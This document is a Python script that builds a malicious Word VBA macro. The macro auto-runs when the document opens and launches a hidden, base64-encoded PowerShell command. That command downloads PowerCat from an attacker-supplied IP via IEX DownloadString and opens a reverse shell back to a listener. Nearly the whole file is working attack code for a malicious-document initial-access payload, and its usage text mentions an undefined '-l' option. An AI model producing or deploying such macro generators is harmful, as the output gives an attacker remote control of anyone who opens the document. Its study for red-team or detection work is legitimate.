'''
Create a VBA Marco for Word to download PowerCat and 
execute a reverse shell to a listener.

'''

import argparse
import base64

parser = argparse.ArgumentParser(prog='macros_reverse_shell.py',
                                description='Script creates a VBA Macro for Word that'
                                             ' downloads PowerCat and executes a reverse'
                                             ' shell to a listener.',
                                usage='python3 macros_reverse_shell.py -i <IP>'
                                      ' -p <PORT> -l <LENGTH>')
parser.add_argument('-i', '--ip', type=str, required=True, help='IP address of the listener')
parser.add_argument('-p', '--port', type=int, default=4444, help='Port of the listener, with default 4444')


def create_reverse_shell(ip, port):
    '''
    Create a reverse shell command to be executed in the target machine.
    '''
    return (f"IEX(New-Object System.Net.WebClient).DownloadString('http://{ip}/powercat.ps1');"
           f"powercat -c {ip} -p {port} -e powershell")


def encode_reverse_shell(string):
    '''
    Base64 encode reverse shell command.
    '''
    bytes_string = string.encode('utf-16le')
    encoded = base64.b64encode(bytes_string)
    base64_string = encoded.decode('utf-8')
    return base64_string


def build_ps_command(base64_string):
    '''
    Build a PowerShell command to included in VBA macros.
    '''
    return f"powershell.exe -nop -w hidden -e {base64_string}"


def split_command_to_vba(string):
    '''
    Write the powershell command in chunks of n characters to VBA macros.
    '''
    n = 50
    vba_script = """
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
"""
    for i in range(0, len(string), n):
        vba_script += f'        Str = Str + "{string[i:i+n]}"\n'

    vba_script += '    CreateObject("Wscript.Shell").Run Str\nEnd Sub'
    return vba_script


if __name__ == '__main__':
    args = parser.parse_args()
    ip = args.ip
    port = args.port
    command = create_reverse_shell(ip, port)
    encoded_string = encode_reverse_shell(command)
    vba_str_block = build_ps_command(encoded_string)
    macros = split_command_to_vba(vba_str_block)
    print(macros)
